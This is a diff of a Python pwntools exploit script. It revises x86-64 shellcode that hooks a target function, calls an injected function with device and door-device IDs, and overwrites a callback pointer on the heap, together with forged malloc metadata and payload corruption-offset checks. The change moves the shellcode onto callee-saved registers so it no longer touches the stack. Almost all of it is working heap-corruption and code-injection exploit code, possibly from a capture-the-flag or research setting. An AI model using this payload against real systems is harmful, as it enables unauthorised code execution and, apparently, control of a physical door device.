@@ -31,33 +31,64 @@ context.binary = EXE_PATH
 MALLOC_META_DATA = b'\x00' * 8 + p32(0x21) + b'\x00' * 4
 
 # Want this one to crash in function without corrupting the the call stack when first N bytes are corrupted (ideally with ascii).
+# sh = asm(f'''
+#     push    rbp
+#     mov     rbp,rsp
+#     movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
+#     mov     rbx, rdi
+#     add     rbx, {CHECK_VALUE_OFFSET}
+#     cmp     DWORD PTR [rbx], {CHECK_VALUE}
+#     jne     .L_skip
+#     push    rdi
+#     push    rsi
+#     push    rdx
+#     push    rax
+#     movabs  rax, {INJECT_FUNCTION_ADDRESS}
+#     mov     edi, {DEVICE_ID}
+#     mov     esi, {DOOR_DEVICE_ID}
+#     mov     edx, 1
+#     call    rax
+#     pop     rax
+#     mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
+#     pop     rdx
+#     pop     rsi
+#     pop     rdi
+#     nop
+#     nop
+# .L_skip:
+#     call    rax
+#     leave
+#     ret
+# ''')
+
+# Stack free version to avoid corrupting GDB backtrace. Using callee preserved registers.
+# rbx, r12, r13, r14, r15, rbp
+# https://stackoverflow.com/questions/18024672/what-registers-are-preserved-through-a-linux-x86-64-function-call
+# This didn't quite work since the stack wouldn't be 16 byte aligned (due to call pushing the return pointer).
+# However, just pushing RBP (and not updating it) somehow mostly preserves the callstack. Pushing further values or updating RBP destroys it.
 sh = asm(f'''
     push    rbp
-    mov     rbp,rsp
-    movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
-    mov     rbx, rdi
-    add     rbx, {CHECK_VALUE_OFFSET}
-    cmp     DWORD PTR [rbx], {CHECK_VALUE}
+    movabs  r15, {ORIGINAL_FUNCTION_ADDRESS}
+    mov     r12, rdi
+    add     r12, {CHECK_VALUE_OFFSET}
+    cmp     DWORD PTR [r12], {CHECK_VALUE}
     jne     .L_skip
-    push    rdi
-    push    rsi
-    push    rdx
-    push    rax
+    mov     r12, rdi
+    mov     r13, rsi
+    mov     r14, rdx
     movabs  rax, {INJECT_FUNCTION_ADDRESS}
     mov     edi, {DEVICE_ID}
     mov     esi, {DOOR_DEVICE_ID}
     mov     edx, 1
     call    rax
-    pop     rax
-    mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
-    pop     rdx
-    pop     rsi
-    pop     rdi
-    nop
-    nop
+    mov     rax, {CALLBACK_HEAP_ADDRESS}
+    mov     qword ptr [rax], r15
+    mov     rdi, r12
+    mov     rsi, r13
+    mov     rdx, r14
 .L_skip:
-    call    rax
-    leave
+    call    r15
+    pop     rbp
     ret
 ''')
 
@@ -106,7 +137,7 @@ inject_call = payload.index(b'\xFF\xD0')
 corruption_offset = inject_call + 2
 corruption_len = 16
 
-end_requirement = payload.index(b'\xFF\xD0', corruption_offset)
+end_requirement = payload.index(b'\x41\xFF\xD7', corruption_offset)
 available_len = end_requirement - corruption_offset
 if available_len < corruption_len:
     raise RuntimeError(f'available_len < corruption_len: {available_len} < {corruption_len}')
